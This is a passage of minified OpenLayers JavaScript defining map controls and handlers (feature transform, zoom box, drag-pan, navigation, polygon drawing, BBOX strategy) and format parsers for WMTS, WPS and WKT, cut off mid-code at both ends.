d=!a.geometryTypes||-1!==OpenLayers.Util.indexOf(a.geometryTypes,b.geometry.CLASS_NAME),e=OpenLayers.Util.indexOf(a.handles,b),e=e+OpenLayers.Util.indexOf(a.rotationHandles,b);b!==a.feature&&(b!==a.box&&-2==e&&d)&&a.setFeature(b)},onComplete:function(b,c){a.events.triggerEvent(\"transformcomplete\",{feature:a.feature})}})},drawHandles:function(){for(var a=this.layer,b=0;8>b;++b)this.rotate&&0===b%2&&a.drawFeature(this.rotationHandles[b/2],this.rotationHandleSymbolizer),a.drawFeature(this.handles[b],\nthis.renderIntent)},transformFeature:function(a){if(!this._setfeature){this.scale*=a.scale||1;this.ratio*=a.ratio||1;var b=this.rotation;this.rotation=(this.rotation+(a.rotation||0))%360;if(!1!==this.events.triggerEvent(\"beforetransform\",a)){var c=this.feature,d=c.geometry,e=this.center;d.rotate(-b,e);a.scale||a.ratio?d.resize(a.scale,e,a.ratio):a.center&&c.move(a.center.getBounds().getCenterLonLat());d.rotate(this.rotation,e);this.layer.drawFeature(c);c.toState(OpenLayers.State.UPDATE);this.events.triggerEvent(\"transform\",\na)}}this.layer.drawFeature(this.box,this.renderIntent);this.drawHandles()},destroy:function(){for(var a,b=0;8>b;++b)a=this.box.geometry.components[b],a._handle.destroy(),a._handle=null,a._rotationHandle&&a._rotationHandle.destroy(),a._rotationHandle=null;this.rotationHandles=this.rotationHandleSymbolizer=this.handles=this.feature=this.center=null;this.box.destroy();this.layer=this.box=null;this.dragControl.destroy();this.dragControl=null;OpenLayers.Control.prototype.destroy.apply(this,arguments)},\nCLASS_NAME:\"OpenLayers.Control.TransformFeature\"});OpenLayers.Handler.Box=OpenLayers.Class(OpenLayers.Handler,{dragHandler:null,boxDivClassName:\"olHandlerBoxZoomBox\",boxOffsets:null,initialize:function(a,b,c){OpenLayers.Handler.prototype.initialize.apply(this,arguments);this.dragHandler=new OpenLayers.Handler.Drag(this,{down:this.startBox,move:this.moveBox,out:this.removeBox,up:this.endBox},{keyMask:this.keyMask})},destroy:function(){OpenLayers.Handler.prototype.destroy.apply(this,arguments);this.dragHandler&&(this.dragHandler.destroy(),this.dragHandler=\nnull)},setMap:function(a){OpenLayers.Handler.prototype.setMap.apply(this,arguments);this.dragHandler&&this.dragHandler.setMap(a)},startBox:function(a){this.callback(\"start\",[]);this.zoomBox=OpenLayers.Util.createDiv(\"zoomBox\",{x:-9999,y:-9999});this.zoomBox.className=this.boxDivClassName;this.zoomBox.style.zIndex=this.map.Z_INDEX_BASE.Popup-1;this.map.viewPortDiv.appendChild(this.zoomBox);OpenLayers.Element.addClass(this.map.viewPortDiv,\"olDrawBox\")},moveBox:function(a){var b=this.dragHandler.start.x,\nc=this.dragHandler.start.y,d=Math.abs(b-a.x),e=Math.abs(c-a.y),f=this.getBoxOffsets();this.zoomBox.style.width=d+f.width+1+\"px\";this.zoomBox.style.height=e+f.height+1+\"px\";this.zoomBox.style.left=(a.x<b?b-d-f.left:b-f.left)+\"px\";this.zoomBox.style.top=(a.y<c?c-e-f.top:c-f.top)+\"px\"},endBox:function(a){var b;if(5<Math.abs(this.dragHandler.start.x-a.x)||5<Math.abs(this.dragHandler.start.y-a.y)){var c=this.dragHandler.start;b=Math.min(c.y,a.y);var d=Math.max(c.y,a.y),e=Math.min(c.x,a.x);a=Math.max(c.x,\na.x);b=new OpenLayers.Bounds(e,d,a,b)}else b=this.dragHandler.start.clone();this.removeBox();this.callback(\"done\",[b])},removeBox:function(){this.map.viewPortDiv.removeChild(this.zoomBox);this.boxOffsets=this.zoomBox=null;OpenLayers.Element.removeClass(this.map.viewPortDiv,\"olDrawBox\")},activate:function(){return OpenLayers.Handler.prototype.activate.apply(this,arguments)?(this.dragHandler.activate(),!0):!1},deactivate:function(){return OpenLayers.Handler.prototype.deactivate.apply(this,arguments)?\n(this.dragHandler.deactivate()&&this.zoomBox&&this.removeBox(),!0):!1},getBoxOffsets:function(){if(!this.boxOffsets){var a=document.createElement(\"div\");a.style.position=\"absolute\";a.style.border=\"1px solid black\";a.style.width=\"3px\";document.body.appendChild(a);var b=3==a.clientWidth;document.body.removeChild(a);var a=parseInt(OpenLayers.Element.getStyle(this.zoomBox,\"border-left-width\")),c=parseInt(OpenLayers.Element.getStyle(this.zoomBox,\"border-right-width\")),d=parseInt(OpenLayers.Element.getStyle(this.zoomBox,\n\"border-top-width\")),e=parseInt(OpenLayers.Element.getStyle(this.zoomBox,\"border-bottom-width\"));this.boxOffsets={left:a,right:c,top:d,bottom:e,width:!1===b?a+c:0,height:!1===b?d+e:0}}return this.boxOffsets},CLASS_NAME:\"OpenLayers.Handler.Box\"});OpenLayers.Control.ZoomBox=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_TOOL,out:!1,keyMask:null,alwaysZoom:!1,zoomOnClick:!0,draw:function(){this.handler=new OpenLayers.Handler.Box(this,{done:this.zoomBox},{keyMask:this.keyMask})},zoomBox:function(a){if(a instanceof OpenLayers.Bounds){var b,c=a.getCenterPixel();if(this.out){b=Math.min(this.map.size.h/(a.bottom-a.top),this.map.size.w/(a.right-a.left));var d=this.map.getExtent(),e=this.map.getLonLatFromPixel(c),f=e.lon-d.getWidth()/\n2*b;a=e.lon+d.getWidth()/2*b;var g=e.lat-d.getHeight()/2*b;b=e.lat+d.getHeight()/2*b;b=new OpenLayers.Bounds(f,g,a,b)}else f=this.map.getLonLatFromPixel({x:a.left,y:a.bottom}),a=this.map.getLonLatFromPixel({x:a.right,y:a.top}),b=new OpenLayers.Bounds(f.lon,f.lat,a.lon,a.lat);f=this.map.getZoom();g=this.map.getSize();a=g.w/2;g=g.h/2;b=this.map.getZoomForExtent(b);d=this.map.getResolution();e=this.map.getResolutionForZoom(b);d==e?this.map.setCenter(this.map.getLonLatFromPixel(c)):this.map.zoomTo(b,\n{x:(d*c.x-e*a)/(d-e),y:(d*c.y-e*g)/(d-e)});f==this.map.getZoom()&&!0==this.alwaysZoom&&this.map.zoomTo(f+(this.out?-1:1))}else this.zoomOnClick&&(this.out?this.map.zoomTo(this.map.getZoom()-1,a):this.map.zoomTo(this.map.getZoom()+1,a))},CLASS_NAME:\"OpenLayers.Control.ZoomBox\"});OpenLayers.Control.DragPan=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_TOOL,panned:!1,interval:0,documentDrag:!1,kinetic:null,enableKinetic:!0,kineticInterval:10,draw:function(){if(this.enableKinetic&&OpenLayers.Kinetic){var a={interval:this.kineticInterval};\"object\"===typeof this.enableKinetic&&(a=OpenLayers.Util.extend(a,this.enableKinetic));this.kinetic=new OpenLayers.Kinetic(a)}this.handler=new OpenLayers.Handler.Drag(this,{move:this.panMap,done:this.panMapDone,down:this.panMapStart},\n{interval:this.interval,documentDrag:this.documentDrag})},panMapStart:function(){this.kinetic&&this.kinetic.begin()},panMap:function(a){this.kinetic&&this.kinetic.update(a);this.panned=!0;this.map.pan(this.handler.last.x-a.x,this.handler.last.y-a.y,{dragging:!0,animate:!1})},panMapDone:function(a){if(this.panned){var b=null;this.kinetic&&(b=this.kinetic.end(a));this.map.pan(this.handler.last.x-a.x,this.handler.last.y-a.y,{dragging:!!b,animate:!1});if(b){var c=this;this.kinetic.move(b,function(a,b,\nf){c.map.pan(a,b,{dragging:!f,animate:!1})})}this.panned=!1}},CLASS_NAME:\"OpenLayers.Control.DragPan\"});OpenLayers.Control.Navigation=OpenLayers.Class(OpenLayers.Control,{dragPan:null,dragPanOptions:null,pinchZoom:null,pinchZoomOptions:null,documentDrag:!1,zoomBox:null,zoomBoxEnabled:!0,zoomWheelEnabled:!0,mouseWheelOptions:null,handleRightClicks:!1,zoomBoxKeyMask:OpenLayers.Handler.MOD_SHIFT,autoActivate:!0,initialize:function(a){this.handlers={};OpenLayers.Control.prototype.initialize.apply(this,arguments)},destroy:function(){this.deactivate();this.dragPan&&this.dragPan.destroy();this.dragPan=null;\nthis.zoomBox&&this.zoomBox.destroy();this.zoomBox=null;this.pinchZoom&&this.pinchZoom.destroy();this.pinchZoom=null;OpenLayers.Control.prototype.destroy.apply(this,arguments)},activate:function(){this.dragPan.activate();this.zoomWheelEnabled&&this.handlers.wheel.activate();this.handlers.click.activate();this.zoomBoxEnabled&&this.zoomBox.activate();this.pinchZoom&&this.pinchZoom.activate();return OpenLayers.Control.prototype.activate.apply(this,arguments)},deactivate:function(){this.pinchZoom&&this.pinchZoom.deactivate();\nthis.zoomBox.deactivate();this.dragPan.deactivate();this.handlers.click.deactivate();this.handlers.wheel.deactivate();return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},draw:function(){this.handleRightClicks&&(this.map.viewPortDiv.oncontextmenu=OpenLayers.Function.False);this.handlers.click=new OpenLayers.Handler.Click(this,{click:this.defaultClick,dblclick:this.defaultDblClick,dblrightclick:this.defaultDblRightClick},{\"double\":!0,stopDouble:!0});this.dragPan=new OpenLayers.Control.DragPan(OpenLayers.Util.extend({map:this.map,\ndocumentDrag:this.documentDrag},this.dragPanOptions));this.zoomBox=new OpenLayers.Control.ZoomBox({map:this.map,keyMask:this.zoomBoxKeyMask});this.dragPan.draw();this.zoomBox.draw();this.handlers.wheel=new OpenLayers.Handler.MouseWheel(this,{up:this.wheelUp,down:this.wheelDown},OpenLayers.Util.extend(this.map.fractionalZoom?{}:{cumulative:!1,interval:50,maxDelta:6},this.mouseWheelOptions));OpenLayers.Control.PinchZoom&&(this.pinchZoom=new OpenLayers.Control.PinchZoom(OpenLayers.Util.extend({map:this.map},\nthis.pinchZoomOptions)))},defaultClick:function(a){a.lastTouches&&2==a.lastTouches.length&&this.map.zoomOut()},defaultDblClick:function(a){this.map.zoomTo(this.map.zoom+1,a.xy)},defaultDblRightClick:function(a){this.map.zoomTo(this.map.zoom-1,a.xy)},wheelChange:function(a,b){this.map.fractionalZoom||(b=Math.round(b));var c=this.map.getZoom(),d;d=Math.max(c+b,0);d=Math.min(d,this.map.getNumZoomLevels());d!==c&&this.map.zoomTo(d,a.xy)},wheelUp:function(a,b){this.wheelChange(a,b||1)},wheelDown:function(a,\nb){this.wheelChange(a,b||-1)},disableZoomBox:function(){this.zoomBoxEnabled=!1;this.zoomBox.deactivate()},enableZoomBox:function(){this.zoomBoxEnabled=!0;this.active&&this.zoomBox.activate()},disableZoomWheel:function(){this.zoomWheelEnabled=!1;this.handlers.wheel.deactivate()},enableZoomWheel:function(){this.zoomWheelEnabled=!0;this.active&&this.handlers.wheel.activate()},CLASS_NAME:\"OpenLayers.Control.Navigation\"});OpenLayers.Control.DrawFeature=OpenLayers.Class(OpenLayers.Control,{layer:null,callbacks:null,multi:!1,featureAdded:function(){},initialize:function(a,b,c){OpenLayers.Control.prototype.initialize.apply(this,[c]);this.callbacks=OpenLayers.Util.extend({done:this.drawFeature,modify:function(a,b){this.layer.events.triggerEvent(\"sketchmodified\",{vertex:a,feature:b})},create:function(a,b){this.layer.events.triggerEvent(\"sketchstarted\",{vertex:a,feature:b})}},this.callbacks);this.layer=a;this.handlerOptions=\nthis.handlerOptions||{};this.handlerOptions.layerOptions=OpenLayers.Util.applyDefaults(this.handlerOptions.layerOptions,{renderers:a.renderers,rendererOptions:a.rendererOptions});\"multi\"in this.handlerOptions||(this.handlerOptions.multi=this.multi);if(a=this.layer.styleMap&&this.layer.styleMap.styles.temporary)this.handlerOptions.layerOptions=OpenLayers.Util.applyDefaults(this.handlerOptions.layerOptions,{styleMap:new OpenLayers.StyleMap({\"default\":a})});this.handler=new b(this,this.callbacks,this.handlerOptions)},\ndrawFeature:function(a){a=new OpenLayers.Feature.Vector(a);!1!==this.layer.events.triggerEvent(\"sketchcomplete\",{feature:a})&&(a.state=OpenLayers.State.INSERT,this.layer.addFeatures([a]),this.featureAdded(a),this.events.triggerEvent(\"featureadded\",{feature:a}))},insertXY:function(a,b){this.handler&&this.handler.line&&this.handler.insertXY(a,b)},insertDeltaXY:function(a,b){this.handler&&this.handler.line&&this.handler.insertDeltaXY(a,b)},insertDirectionLength:function(a,b){this.handler&&this.handler.line&&\nthis.handler.insertDirectionLength(a,b)},insertDeflectionLength:function(a,b){this.handler&&this.handler.line&&this.handler.insertDeflectionLength(a,b)},undo:function(){return this.handler.undo&&this.handler.undo()},redo:function(){return this.handler.redo&&this.handler.redo()},finishSketch:function(){this.handler.finishGeometry()},cancel:function(){this.handler.cancel()},CLASS_NAME:\"OpenLayers.Control.DrawFeature\"});OpenLayers.Handler.Polygon=OpenLayers.Class(OpenLayers.Handler.Path,{holeModifier:null,drawingHole:!1,polygon:null,createFeature:function(a){a=this.layer.getLonLatFromViewPortPx(a);a=new OpenLayers.Geometry.Point(a.lon,a.lat);this.point=new OpenLayers.Feature.Vector(a);this.line=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LinearRing([this.point.geometry]));this.polygon=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Polygon([this.line.geometry]));this.callback(\"create\",[this.point.geometry,\nthis.getSketch()]);this.point.geometry.clearBounds();this.layer.addFeatures([this.polygon,this.point],{silent:!0})},addPoint:function(a){if(!this.drawingHole&&this.holeModifier&&this.evt&&this.evt[this.holeModifier])for(var b=this.point.geometry,c=this.control.layer.features,d,e=c.length-1;0<=e;--e)if(d=c[e].geometry,(d instanceof OpenLayers.Geometry.Polygon||d instanceof OpenLayers.Geometry.MultiPolygon)&&d.intersects(b)){b=c[e];this.control.layer.removeFeatures([b],{silent:!0});this.control.layer.events.registerPriority(\"sketchcomplete\",\nthis,this.finalizeInteriorRing);this.control.layer.events.registerPriority(\"sketchmodified\",this,this.enforceTopology);b.geometry.addComponent(this.line.geometry);this.polygon=b;this.drawingHole=!0;break}OpenLayers.Handler.Path.prototype.addPoint.apply(this,arguments)},getCurrentPointIndex:function(){return this.line.geometry.components.length-2},enforceTopology:function(a){a=a.vertex;var b=this.line.geometry.components;this.polygon.geometry.intersects(a)||(b=b[b.length-3],a.x=b.x,a.y=b.y)},finishGeometry:function(){this.line.geometry.removeComponent(this.line.geometry.components[this.line.geometry.components.length-\n2]);this.removePoint();this.finalize()},finalizeInteriorRing:function(){var a=this.line.geometry,b=0!==a.getArea();if(b){for(var c=this.polygon.geometry.components,d=c.length-2;0<=d;--d)if(a.intersects(c[d])){b=!1;break}if(b)a:for(d=c.length-2;0<d;--d)for(var e=c[d].components,f=0,g=e.length;f<g;++f)if(a.containsPoint(e[f])){b=!1;break a}}b?this.polygon.state!==OpenLayers.State.INSERT&&(this.polygon.state=OpenLayers.State.UPDATE):this.polygon.geometry.removeComponent(a);this.restoreFeature();return!1},\ncancel:function(){this.drawingHole&&(this.polygon.geometry.removeComponent(this.line.geometry),this.restoreFeature(!0));return OpenLayers.Handler.Path.prototype.cancel.apply(this,arguments)},restoreFeature:function(a){this.control.layer.events.unregister(\"sketchcomplete\",this,this.finalizeInteriorRing);this.control.layer.events.unregister(\"sketchmodified\",this,this.enforceTopology);this.layer.removeFeatures([this.polygon],{silent:!0});this.control.layer.addFeatures([this.polygon],{silent:!0});this.drawingHole=\n!1;a||this.control.layer.events.triggerEvent(\"sketchcomplete\",{feature:this.polygon})},destroyFeature:function(a){OpenLayers.Handler.Path.prototype.destroyFeature.call(this,a);this.polygon=null},drawFeature:function(){this.layer.drawFeature(this.polygon,this.style);this.layer.drawFeature(this.point,this.style)},getSketch:function(){return this.polygon},getGeometry:function(){var a=this.polygon&&this.polygon.geometry;a&&this.multi&&(a=new OpenLayers.Geometry.MultiPolygon([a]));return a},CLASS_NAME:\"OpenLayers.Handler.Polygon\"});OpenLayers.Control.EditingToolbar=OpenLayers.Class(OpenLayers.Control.Panel,{citeCompliant:!1,initialize:function(a,b){OpenLayers.Control.Panel.prototype.initialize.apply(this,[b]);this.addControls([new OpenLayers.Control.Navigation]);var c=[new OpenLayers.Control.DrawFeature(a,OpenLayers.Handler.Point,{displayClass:\"olControlDrawFeaturePoint\",handlerOptions:{citeCompliant:this.citeCompliant}}),new OpenLayers.Control.DrawFeature(a,OpenLayers.Handler.Path,{displayClass:\"olControlDrawFeaturePath\",handlerOptions:{citeCompliant:this.citeCompliant}}),\nnew OpenLayers.Control.DrawFeature(a,OpenLayers.Handler.Polygon,{displayClass:\"olControlDrawFeaturePolygon\",handlerOptions:{citeCompliant:this.citeCompliant}})];this.addControls(c)},draw:function(){var a=OpenLayers.Control.Panel.prototype.draw.apply(this,arguments);null===this.defaultControl&&(this.defaultControl=this.controls[0]);return a},CLASS_NAME:\"OpenLayers.Control.EditingToolbar\"});OpenLayers.Strategy.BBOX=OpenLayers.Class(OpenLayers.Strategy,{bounds:null,resolution:null,ratio:2,resFactor:null,response:null,activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);a&&(this.layer.events.on({moveend:this.update,refresh:this.update,visibilitychanged:this.update,scope:this}),this.update());return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&&this.layer.events.un({moveend:this.update,refresh:this.update,visibilitychanged:this.update,\nscope:this});return a},update:function(a){var b=this.getMapBounds();null!==b&&(a&&a.force||this.layer.visibility&&this.layer.calculateInRange()&&this.invalidBounds(b))&&(this.calculateBounds(b),this.resolution=this.layer.map.getResolution(),this.triggerRead(a))},getMapBounds:function(){if(null===this.layer.map)return null;var a=this.layer.map.getExtent();a&&!this.layer.projection.equals(this.layer.map.getProjectionObject())&&(a=a.clone().transform(this.layer.map.getProjectionObject(),this.layer.projection));\nreturn a},invalidBounds:function(a){a||(a=this.getMapBounds());a=!this.bounds||!this.bounds.containsBounds(a);!a&&this.resFactor&&(a=this.resolution/this.layer.map.getResolution(),a=a>=this.resFactor||a<=1/this.resFactor);return a},calculateBounds:function(a){a||(a=this.getMapBounds());var b=a.getCenterLonLat(),c=a.getWidth()*this.ratio;a=a.getHeight()*this.ratio;this.bounds=new OpenLayers.Bounds(b.lon-c/2,b.lat-a/2,b.lon+c/2,b.lat+a/2)},triggerRead:function(a){!this.response||a&&!0===a.noAbort||\n(this.layer.protocol.abort(this.response),this.layer.events.triggerEvent(\"loadend\"));var b={filter:this.createFilter()};this.layer.events.triggerEvent(\"loadstart\",b);this.response=this.layer.protocol.read(OpenLayers.Util.applyDefaults({filter:b.filter,callback:this.merge,scope:this},a))},createFilter:function(){var a=new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.BBOX,value:this.bounds,projection:this.layer.projection});this.layer.filter&&(a=new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.AND,\nfilters:[this.layer.filter,a]}));return a},merge:function(a){this.layer.destroyFeatures();if(a.success()){var b=a.features;if(b&&0<b.length){var c=this.layer.projection,d=this.layer.map.getProjectionObject();if(!d.equals(c))for(var e,f=0,g=b.length;f<g;++f)(e=b[f].geometry)&&e.transform(c,d);this.layer.addFeatures(b)}}else this.bounds=null;this.response=null;this.layer.events.triggerEvent(\"loadend\",{response:a})},CLASS_NAME:\"OpenLayers.Strategy.BBOX\"});OpenLayers.Layer.WorldWind=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{},isBaseLayer:!0,lzd:null,zoomLevels:null,initialize:function(a,b,c,d,e,f){this.lzd=c;this.zoomLevels=d;c=[];c.push(a,b,e,f);OpenLayers.Layer.Grid.prototype.initialize.apply(this,c);this.params=OpenLayers.Util.applyDefaults(this.params,this.DEFAULT_PARAMS)},getZoom:function(){var a=this.map.getZoom();this.map.getMaxExtent();return a-=Math.log(this.maxResolution/(this.lzd/512))/Math.log(2)},getURL:function(a){a=this.adjustBounds(a);\nvar b=this.getZoom(),c=this.map.getMaxExtent(),d=this.lzd/Math.pow(2,this.getZoom()),e=Math.floor((a.left-c.left)/d);a=Math.floor((a.bottom-c.bottom)/d);return this.map.getResolution()<=this.lzd/512&&this.getZoom()<=this.zoomLevels?this.getFullRequestString({L:b,X:e,Y:a}):OpenLayers.Util.getImageLocation(\"blank.gif\")},CLASS_NAME:\"OpenLayers.Layer.WorldWind\"});OpenLayers.Protocol.CSW=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Protocol.CSW.DEFAULTS);var b=OpenLayers.Protocol.CSW[\"v\"+a.version.replace(/\\./g,\"_\")];if(!b)throw\"Unsupported CSW version: \"+a.version;return new b(a)};OpenLayers.Protocol.CSW.DEFAULTS={version:\"2.0.2\"};OpenLayers.Format.WMTSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:\"1.0.0\",yx:{\"urn:ogc:def:crs:EPSG::4326\":!0},createLayer:function(a,b){if(!(\"layer\"in b))throw Error(\"Missing property 'layer' in configuration.\");for(var c=a.contents,d,e=0,f=c.layers.length;e<f;++e)if(c.layers[e].identifier===b.layer){d=c.layers[e];break}if(!d)throw Error(\"Layer not found\");var g=b.format;!g&&(d.formats&&d.formats.length)&&(g=d.formats[0]);var h;b.matrixSet?h=c.tileMatrixSets[b.matrixSet]:\n1<=d.tileMatrixSetLinks.length&&(h=c.tileMatrixSets[d.tileMatrixSetLinks[0].tileMatrixSet]);if(!h)throw Error(\"matrixSet not found\");for(var k,e=0,f=d.styles.length;e<f&&(k=d.styles[e],!k.isDefault);++e);c=b.requestEncoding;if(!c&&(c=\"KVP\",a.operationsMetadata.GetTile.dcp.http)){var l=a.operationsMetadata.GetTile.dcp.http;l.get[0].constraints&&(l=l.get[0].constraints.GetEncoding.allowedValues,l.KVP||!l.REST&&!l.RESTful||(c=\"REST\"))}var l=[],m=b.params||{};delete b.params;for(var n=0,p=d.dimensions.length;n<\np;n++){var q=d.dimensions[n];l.push(q.identifier);m.hasOwnProperty(q.identifier)||(m[q.identifier]=q[\"default\"])}var n=b.projection||h.supportedCRS.replace(/urn:ogc:def:crs:(\\w+):(.*:)?(\\w+)$/,\"$1:$3\"),p=b.units||(\"EPSG:4326\"===n?\"degrees\":\"m\"),q=[],r;for(r in h.matrixIds)h.matrixIds.hasOwnProperty(r)&&q.push(2.8E-4*h.matrixIds[r].scaleDenominator/OpenLayers.METERS_PER_INCH/OpenLayers.INCHES_PER_UNIT[p]);if(\"REST\"===c&&d.resourceUrls){r=[];for(var f=0,s=d.resourceUrls.length;f<s;++f)e=d.resourceUrls[f],\ne.format===g&&\"tile\"===e.resourceType&&r.push(e.template)}else{s=a.operationsMetadata.GetTile.dcp.http.get;r=[];for(var t,e=0,f=s.length;e<f;e++)t=s[e].constraints,(!t||t&&t.GetEncoding.allowedValues[c])&&r.push(s[e].url)}return new OpenLayers.Layer.WMTS(OpenLayers.Util.applyDefaults(b,{url:r,requestEncoding:c,name:d.title,style:k.identifier,format:g,matrixIds:h.matrixIds,matrixSet:h.identifier,projection:n,units:p,resolutions:!1===b.isBaseLayer?void 0:q,serverResolutions:q,tileFullExtent:h.bounds,\ndimensions:l,params:m}))},CLASS_NAME:\"OpenLayers.Format.WMTSCapabilities\"});OpenLayers.Layer.Google.v3={DEFAULTS:{sphericalMercator:!0,projection:\"EPSG:900913\"},animationEnabled:!0,loadMapObject:function(){this.type||(this.type=google.maps.MapTypeId.ROADMAP);var a,b=OpenLayers.Layer.Google.cache[this.map.id];b?(a=b.mapObject,++b.count):(a=this.map.getCenter(),b=document.createElement(\"div\"),b.className=\"olForeignContainer\",b.style.width=\"100%\",b.style.height=\"100%\",a=new google.maps.Map(b,{center:a?new google.maps.LatLng(a.lat,a.lon):new google.maps.LatLng(0,0),zoom:this.map.getZoom()||\n0,mapTypeId:this.type,disableDefaultUI:!0,keyboardShortcuts:!1,draggable:!1,disableDoubleClickZoom:!0,scrollwheel:!1,streetViewControl:!1}),b=document.createElement(\"div\"),b.style.width=\"100%\",b.style.height=\"100%\",a.controls[google.maps.ControlPosition.TOP_LEFT].push(b),b={googleControl:b,mapObject:a,count:1},OpenLayers.Layer.Google.cache[this.map.id]=b);this.mapObject=a;this.setGMapVisibility(this.visibility)},onMapResize:function(){this.visibility&&google.maps.event.trigger(this.mapObject,\"resize\")},\nsetGMapVisibility:function(a){var b=OpenLayers.Layer.Google.cache[this.map.id],c=this.map;if(b){for(var d=this.type,e=c.layers,f,g=e.length-1;0<=g;--g)if(f=e[g],f instanceof OpenLayers.Layer.Google&&!0===f.visibility&&!0===f.inRange){d=f.type;a=!0;break}e=this.mapObject.getDiv();if(!0===a){if(e.parentNode!==c.div)if(b.rendered)c.div.appendChild(e),b.googleControl.appendChild(c.viewPortDiv),google.maps.event.trigger(this.mapObject,\"resize\");else{var h=this;google.maps.event.addListenerOnce(this.mapObject,\n\"tilesloaded\",function(){b.rendered=!0;h.setGMapVisibility(h.getVisibility());h.moveTo(h.map.getCenter())})}this.mapObject.setMapTypeId(d)}else b.googleControl.hasChildNodes()&&(c.div.appendChild(c.viewPortDiv),c.div.removeChild(e))}},getMapContainer:function(){return this.mapObject.getDiv()},getMapObjectBoundsFromOLBounds:function(a){var b=null;null!=a&&(b=this.sphericalMercator?this.inverseMercator(a.bottom,a.left):new OpenLayers.LonLat(a.bottom,a.left),a=this.sphericalMercator?this.inverseMercator(a.top,\na.right):new OpenLayers.LonLat(a.top,a.right),b=new google.maps.LatLngBounds(new google.maps.LatLng(b.lat,b.lon),new google.maps.LatLng(a.lat,a.lon)));return b},getMapObjectLonLatFromMapObjectPixel:function(a){var b=this.map.getSize(),c=this.getLongitudeFromMapObjectLonLat(this.mapObject.center),d=this.getLatitudeFromMapObjectLonLat(this.mapObject.center),e=this.map.getResolution();a=new OpenLayers.LonLat(c+(a.x-b.w/2)*e,d-(a.y-b.h/2)*e);this.wrapDateLine&&(a=a.wrapDateLine(this.maxExtent));return this.getMapObjectLonLatFromLonLat(a.lon,\na.lat)},getMapObjectPixelFromMapObjectLonLat:function(a){var b=this.getLongitudeFromMapObjectLonLat(a);a=this.getLatitudeFromMapObjectLonLat(a);var c=this.map.getResolution(),d=this.map.getExtent();return this.getMapObjectPixelFromXY(1/c*(b-d.left),1/c*(d.top-a))},setMapObjectCenter:function(a,b){if(!1===this.animationEnabled&&b!=this.mapObject.zoom){var c=this.getMapContainer();google.maps.event.addListenerOnce(this.mapObject,\"idle\",function(){c.style.visibility=\"\"});c.style.visibility=\"hidden\"}this.mapObject.setOptions({center:a,\nzoom:b})},getMapObjectZoomFromMapObjectBounds:function(a){return this.mapObject.getBoundsZoomLevel(a)},getMapObjectLonLatFromLonLat:function(a,b){var c;this.sphericalMercator?(c=this.inverseMercator(a,b),c=new google.maps.LatLng(c.lat,c.lon)):c=new google.maps.LatLng(b,a);return c},getMapObjectPixelFromXY:function(a,b){return new google.maps.Point(a,b)}};OpenLayers.Format.WPSDescribeProcess=OpenLayers.Class(OpenLayers.Format.XML,{VERSION:\"1.0.0\",namespaces:{wps:\"http://www.opengis.net/wps/1.0.0\",ows:\"http://www.opengis.net/ows/1.1\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\"},schemaLocation:\"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd\",defaultPrefix:\"wps\",regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,\n[a]));a&&9==a.nodeType&&(a=a.documentElement);var b={};this.readNode(a,b);return b},readers:{wps:{ProcessDescriptions:function(a,b){b.processDescriptions={};this.readChildNodes(a,b.processDescriptions)},ProcessDescription:function(a,b){var c={processVersion:this.getAttributeNS(a,this.namespaces.wps,\"processVersion\"),statusSupported:\"true\"===a.getAttribute(\"statusSupported\"),storeSupported:\"true\"===a.getAttribute(\"storeSupported\")};this.readChildNodes(a,c);b[c.identifier]=c},DataInputs:function(a,\nb){b.dataInputs=[];this.readChildNodes(a,b.dataInputs)},ProcessOutputs:function(a,b){b.processOutputs=[];this.readChildNodes(a,b.processOutputs)},Output:function(a,b){var c={};this.readChildNodes(a,c);b.push(c)},ComplexOutput:function(a,b){b.complexOutput={};this.readChildNodes(a,b.complexOutput)},LiteralOutput:function(a,b){b.literalOutput={};this.readChildNodes(a,b.literalOutput)},Input:function(a,b){var c={maxOccurs:parseInt(a.getAttribute(\"maxOccurs\")),minOccurs:parseInt(a.getAttribute(\"minOccurs\"))};\nthis.readChildNodes(a,c);b.push(c)},BoundingBoxData:function(a,b){b.boundingBoxData={};this.readChildNodes(a,b.boundingBoxData)},CRS:function(a,b){b.CRSs||(b.CRSs={});b.CRSs[this.getChildValue(a)]=!0},LiteralData:function(a,b){b.literalData={};this.readChildNodes(a,b.literalData)},ComplexData:function(a,b){b.complexData={};this.readChildNodes(a,b.complexData)},Default:function(a,b){b[\"default\"]={};this.readChildNodes(a,b[\"default\"])},Supported:function(a,b){b.supported={};this.readChildNodes(a,b.supported)},\nFormat:function(a,b){var c={};this.readChildNodes(a,c);b.formats||(b.formats={});b.formats[c.mimeType]=!0},MimeType:function(a,b){b.mimeType=this.getChildValue(a)}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:\"OpenLayers.Format.WPSDescribeProcess\"});OpenLayers.Format.WKT=OpenLayers.Class(OpenLayers.Format,{initialize:function(a){this.regExes={typeStr:/^\\s*(\\w+)\\s*\\(\\s*(.*)\\s*\\)\\s*$/,spaces:/\\s+/,parenComma:/\\)\\s*,\\s*\\(/,doubleParenComma:/\\)\\s*\\)\\s*,\\s*\\(\\s*\\(/,trimParens:/^\\s*\\(?(.*?)\\)?\\s*$/};OpenLayers.Format.prototype.initialize.apply(this,[a])},read:function(a){var b,c;a=a.replace(/[\\n\\r]/g,\" 